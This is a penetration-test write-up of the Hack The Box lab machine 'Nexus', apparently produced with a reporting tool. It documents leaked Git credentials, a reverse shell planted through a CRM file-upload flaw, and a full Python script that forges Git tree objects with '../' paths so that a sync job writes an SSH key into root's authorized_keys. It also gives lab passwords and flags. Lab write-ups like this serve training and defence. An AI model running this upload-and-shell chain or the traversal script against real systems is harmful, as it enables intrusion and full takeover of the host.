

## tags: \[pentnote, report, htb, nexus\] engagement: HTB\_Nexus date: 2026-07-06 author: Mohammad Obeidat tool: PentNote v1.2.0

# PentNote Report - HTB\_Nexus

## Executive Summary

During the security assessment of the target host `10.129.47.24` (HTB\_Nexus) conducted on July 5–6, 2026, a multi-stage attack chain was successfully executed, resulting in full system compromise. Initial reconnaissance via Nmap identified two exposed services, SSH (port 22) and a web application (port 80), the latter redirecting to a government-styled energy authority site hosted on `nexus.htb`. A static careers page on this site disclosed an internal employee email address (`j.matthew@nexus.htb`), which later proved useful for CRM authentication. Virtual-host brute-forcing uncovered two additional subdomains, `git.nexus.htb` and `billing.nexus.htb`, exposing a public Gitea instance. Enumeration of a public repository's commit history revealed a cleartext database password that had been rotated but never invalidated, granting authenticated access to a Krayin CRM instance on `billing.nexus.htb`. This instance was exploited via an unrestricted file upload vulnerability (CVE-2026-38526) in the email attachment feature, yielding a reverse shell as `www-data`. Further enumeration of the Krayin configuration files revealed a second, still-valid credential pair, enabling SSH access as the local user `jones`. Privilege escalation was ultimately achieved by abusing a Gitea template-sync systemd timer vulnerable to directory traversal, allowing an SSH public key to be written directly into `root`'s `authorized\_keys` file. This report maps each finding to the MITRE ATT&CK framework and aligns remediation strategies with the NSA D3FEND matrix.

| **Client** | Hack The Box |
| :-: | - |
| **Engagement type** | Full Scope / Machine Assessment |
| **Scope** | 10.129.47.24 |
| **Operator** | Mohammad Obeidat |
| **Start date** | 2026-07-05 |
| **End date** | 2026-07-06 |


| Severity | Count |
| - | -: |
| Critical | 1 |
| High | 1 |
| Medium | 1 |
| Low | 0 |
| Info | 0 |



## Attack Chains Detected

- **Reconnaissance (Nmap)** ➔ **Virtual Host Enumeration (ffuf)** ➔ **Gitea Repository Enumeration** ➔ **Credential Harvesting (Commit History)** ➔ **Krayin CRM Exploitation (Unrestricted File Upload)** ➔ **Reverse Shell (`www-data`)** ➔ **Post-Exploitation Credential Harvesting** ➔ **SSH Access (`jones`)** ➔ **Gitea Template Sync Directory Traversal** ➔ **Root Flag Extraction** \[Completed\]


## Top 5 Risks

| \#  | Finding                                     | Severity | Risk Score | Exploitability                   |
| --- | ------------------------------------------- | -------- | ---------- | -------------------------------- |
| 1   | Gitea Template Sync Directory Traversal     | Critical | 9.8        | Easy (Local binary manipulation) |
| 2   | Krayin CRM Unrestricted File Upload         | High     | 8.5        | Easy (Burp Suite modification)   |
| 3   | Exposed Credentials in Gitea Commit History | Medium   | 6.5        | Easy (Basic Git usage)           |



## Remediation Roadmap

| Priority | Finding | Severity | Effort | D3FEND | Recommendation |
| - | - | - | - | - | - |
| 1 | Gitea Template Sync Directory Traversal | Critical | Medium | D3-APIT | Sanitize `os.path.join()` inputs and restrict write permissions |
| 2 | Krayin CRM Unrestricted File Upload | High | Low | D3-FUAC | Validate file extensions server-side and enforce MIME type checks |
| 3 | Exposed Credentials in Gitea Commit History | Medium | Low | D3-CWAM | Rotate exposed credentials and enforce secret scanning on push |



## Affected Assets

| Asset | Finding Count |
| - | -: |
| 10.129.47.24 | 3 |



## Target Group Findings

### HTB\_Nexus Findings (10.129.47.24/32)

| Severity | Finding | Host |
| - | - | - |
| Critical | Gitea Template Sync Directory Traversal | 10.129.47.24 |
| High | Krayin CRM Unrestricted File Upload | 10.129.47.24 |
| Medium | Exposed Credentials in Gitea Commit History | 10.129.47.24 |



## Recon & Enumeration Methodology (Mindset Study)

The engagement began with a full-port Nmap scan, which returned only two open services — **SSH (22)** and **HTTP (80)** — with the web service redirecting to `nexus.htb`. The landing page presented a government-styled energy authority portal with no exploitable functionality of its own, but its **Careers** section listed an open vacancy along with a direct hiring-manager contact (`j.matthew@nexus.htb`). This kind of incidental information disclosure is easy to overlook, yet it later became the exact account used to authenticate against the CRM. Since the front-facing site offered no further attack surface, virtual-host brute-forcing with `ffuf` was the logical next step. Filtering out the default vhost response by word count revealed two meaningful subdomains: `git.nexus.htb`, hosting a public Gitea instance, and `billing.nexus.htb`, which turned out to be the Krayin CRM login. This pivot — from a dead-end marketing site to a forgotten internal Git server — is what unlocked the rest of the chain.


## Findings

### 1. Exposed Credentials in Gitea Commit History (Medium)

- **Description:** The public Gitea repository `admin/krayin-docker-setup` contained a commit history exposing the `DB\_PASSWORD` variable in cleartext (`N27xh!!2ucY04`). Although a later commit updated the `APP\_URL` to point to `billing.nexus.htb`, the exposed password itself was never rotated in the underlying application, and remained valid for authenticating to the Krayin CRM instance.

- **Impact:** An attacker can leverage credentials recovered from version-control history to gain authenticated access to the Krayin CRM application, providing a foothold for further exploitation.

- **Evidence & Proof of Concept:** Browsing the commit diff directly in the Gitea web UI surfaced the plaintext password:

 ![Exposed DB\_PASSWORD in Gitea commit diff](images/gitea_env_diff.png) *Gitea web interface showing the `.env` commit diff with `DB\_PASSWORD=N27xh!!2ucY04` exposed in cleartext.*

- The same disclosure was confirmed by cloning the repository locally and inspecting the commit log directly:

```
git clone http://git.nexus.htb/admin/krayin-docker-setup.git  
cd krayin-docker-setup  
git log -p | grep DB\_PASSWORD
```

![git log -p output revealing DB\_PASSWORD](images/git_log_password.png) 

`git log -p | grep DB\_PASSWORD` confirming the exposed credential directly from the command line.


### 2. Krayin CRM Unrestricted File Upload (High)

- **Description:** The Krayin CRM instance (version 2.2.0) running on `billing.nexus.htb` is vulnerable to **CVE-2026-38526**, which allows an authenticated user to upload arbitrary files via the email/attachment functionality. By intercepting the upload request in Burp Suite and renaming a PHP reverse shell (disguised as `shell.png`) to `shell.php` before forwarding, extension-based validation was bypassed entirely, allowing arbitrary PHP execution.

- **Impact:** Successful exploitation grants an attacker a low-privilege shell on the target system as `www-data`, enabling further enumeration and lateral movement.

- **Evidence & Proof of Concept:** Using the [pentestmonkey PHP reverse shell](https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php) (IP/port updated to the attacking host), the payload was uploaded as an email attachment and the request intercepted in Burp Suite, where the file extension was changed from `.png` to `.php`:

![Burp Suite intercept renaming the upload to .php](images/burp_upload_intercept.png) *Burp Suite proxy intercepting the `POST /admin/tinymce/upload` request, with the filename renamed from `.png` to `.php` before forwarding.*

- A Netcat listener was started, and the uploaded webshell path was requested directly to trigger the callback:

```
nc -lnvp 20202  
curl http://billing.nexus.htb/storage/tinymce/\<hash\>/shell.php
```

 ![Burp Suite request triggering the uploaded webshell](images/burp_trigger_request.png) *Follow-up `GET` request to the uploaded webshell path, captured in Burp Suite, used to trigger the reverse shell callback.*

![Reverse shell caught on the Netcat listener](images/reverse_shell_caught.png) *Netcat listener catching the reverse shell connection, confirming code execution as `www-data`.*

- Post-exploitation enumeration of the Krayin application directory revealed a **second**, still-valid set of database credentials in the live `.env` file, distinct from the one found in the Gitea commit history:

```
cat /var/www/krayin/.env | grep DB\_PASSWORD
```

  ![Second DB\_PASSWORD recovered from the live .env file](images/krayin_env_leak.png) 
* Live `.env` file on the compromised host exposing a second `DB\_PASSWORD` (`y27xb3ha!!74GbR`), which was later reused successfully for SSH access as `jones`.*


### 3. Gitea Template Sync Directory Traversal (Critical)

- **Description:** The `gitea-template-sync.timer` systemd service triggers a Python script (`/etc/gitea/template-sync.py`) every few minutes, which clones repositories marked as *templates* and syncs their file contents into `/home/git/template-staging/\<owner\>/\<repo\>/`. The script constructs destination paths using `os.path.join(stage\_path, filepath)` on raw file paths returned by `git ls-tree`, without sanitizing directory traversal sequences (`../`). Git's own path validation (`verify\_path()`) normally blocks committing filenames containing `..`, but this protection can be bypassed by crafting raw Git tree objects directly inside `.git/objects/`, sidestepping the CLI checks entirely.

- **Impact:** By constructing a malicious template repository whose tree structure resolves to `../../../../../root/.ssh/authorized\_keys`, an attacker can have the automated sync service write an arbitrary SSH public key into the `root` user's `authorized\_keys` file, resulting in full, unauthenticated root-level compromise on the next timer execution.

- **Evidence & Proof of Concept:**

- A local SSH key pair was generated for the attack, and a new Gitea repository (`rce`) was created and flagged as a **Template**, ensuring it would be picked up by the sync service:

```
ssh-keygen -t ed25519 -f /tmp/.k -N ''  
git clone http://jones:'y27xb3ha!!74GbR'@git.nexus.htb/jones/rce.git  
cd rce && touch README.md
```

- The following script constructs raw Git tree/commit objects containing five levels of `../` traversal — enough to escape from `/home/git/template-staging/jones/rce/` up to `/root/` — and writes the generated SSH public key as `authorized\_keys`:

```
\# build.py - crafts raw Git objects with a directory-traversal payload  
\# Custom PoC script developed for this engagement, targeting the  
\# unsanitized os.path.join() call in /etc/gitea/template-sync.py  
\#!/usr/bin/env python3  
import hashlib,zlib,os,subprocess,sys,time  
  
def write\_obj(data,t):  
    h=("%s %d"%(t,len(data))).encode()+b"\\x00"  
    s=h+data  
    sha=hashlib.sha1(s).hexdigest()  
    d=os.path.join(".git","objects",sha\[:2\])  
    os.makedirs(d,exist\_ok=True)  
    p=os.path.join(d,sha\[2:\])  
    if not os.path.exists(p):  
        open(p,"wb").write(zlib.compress(s))  
    return sha  
  
def entry(mode,name,sha):  
    return("%s %s"%(mode,name)).encode()+b"\\x00"+bytes.fromhex(sha)  
  
if not os.path.isdir(".git"):  
    print("Run inside git repo");sys.exit(1)  
  
r=subprocess.run(\["cat","/tmp/.k.pub"\],capture\_output=True,text=True)  
if r.returncode!=0:  
    print("ssh-keygen -t ed25519 -f /tmp/.k -N ''");sys.exit(1)  
  
key=r.stdout.strip()+"\\n"  
blob=write\_obj(key.encode(),"blob")  
readme=write\_obj(b"\# Template\\n","blob")  
ssh\_t=write\_obj(entry("100644","authorized\_keys",blob),"tree")  
cur=write\_obj(entry("40000",".ssh",ssh\_t),"tree")  
fir=write\_obj(entry("40000","root",cur),"tree")  
  
for i in range(4):  
    fir=write\_obj(entry("40000","..",fir),"tree")  
  
root=write\_obj(entry("100644","README.md",readme)+entry("40000","..",fir),"tree")  
ts=int(time.time())  
c="tree %s\\nauthor x \<x@x\> %d +0000\\ncommitter x \<x@x\> %d +0000\\n\\ninit\\n"%(root,ts,ts)  
sha=write\_obj(c.encode(),"commit")  
os.makedirs(os.path.join(".git","refs","heads"),exist\_ok=True)  
open(os.path.join(".git","refs","heads","main"),"w").write(sha+"\\n")  
print("Done: "+sha)
```

- The crafted commit was force-pushed to the template repository, and after the sync timer fired, the payload was confirmed in the server-side sync log:

```
python3 /tmp/build.py  
git push -u origin main --force

- \[Template sync log excerpt\]  
Syncing template: jones/rce  
synced: README.md  
synced: ../../../../../root/.ssh/authorized\_keys  
Template sync complete
```

- With the public key now trusted by `root`, authentication was performed directly using the corresponding private key:

```
ssh -i /tmp/root\_key root@10.129.47.24  
cat /root/root.txt
```

![Root shell obtained via the SSH key planted by the traversal exploit](images/root_flag.png) 

*Root shell obtained via `ssh -i /tmp/root\_key root@10.129.47.24`, confirming full privilege escalation and root flag retrieval.*


## Evidence Appendix

### Captured Credentials

| Service              | Username              | Password          |
| -------------------- | --------------------- | ----------------- |
| Krayin CRM (Initial) | `j.matthew@nexus.htb` | `N27xh!!2ucY04`   |
| SSH (User `jones`)   | `jones`               | `y27xb3ha!!74GbR` |


### Flags Recovered

| Flag Type     | Flag Value                         |
| ------------- | ---------------------------------- |
| **User Flag** | `3290dde5fca195ea451632d54d4b60da` |
| **Root Flag** | `c25914b5b518500d1c71da5c8331ac9d` |


## MITRE ATT&CK Coverage

| Technique ID  | Technique Name                               | Application                                                                  |
| ------------- | -------------------------------------------- | ---------------------------------------------------------------------------- |
| **T1190**     | Exploit Public-Facing Application            | Exploiting CVE-2026-38526 in Krayin CRM                                      |
| **T1552.004** | Credentials in Files (Network Configuration) | Extracting credentials from `.env` and Gitea commit history                  |
| **T1078.003** | Valid Accounts (Local Accounts)              | Using `jones` credentials for SSH access                                     |
| **T1053.006** | Scheduled Task/Job: Systemd Timers           | Abusing `gitea-template-sync.timer` via directory traversal for root privesc |
| **T1005**     | Data from Local System                       | Extracting user and root flags after each compromise stage                   |



## References

- CVE-2026-38526 — Krayin CRM Unrestricted File Upload vulnerability

- [pentestmonkey/php-reverse-shell](https://github.com/pentestmonkey/php-reverse-shell) — PHP reverse shell payload used for initial access (© 2007 pentestmonkey, GPLv2)

- `build.py` — original PoC script authored for this engagement to exploit the Gitea template-sync directory traversal


## 📝 Acknowledgement

This report was generated using **PentNote** – an advanced documentation framework for penetration testers that dynamically integrates MITRE ATT&CK mapping and NSA D3FEND countermeasures, ensuring comprehensive and professional reporting with minimal effort. For more information: [PentNote on GitHub](https://github.com/A1GCH-afk/PentNote)

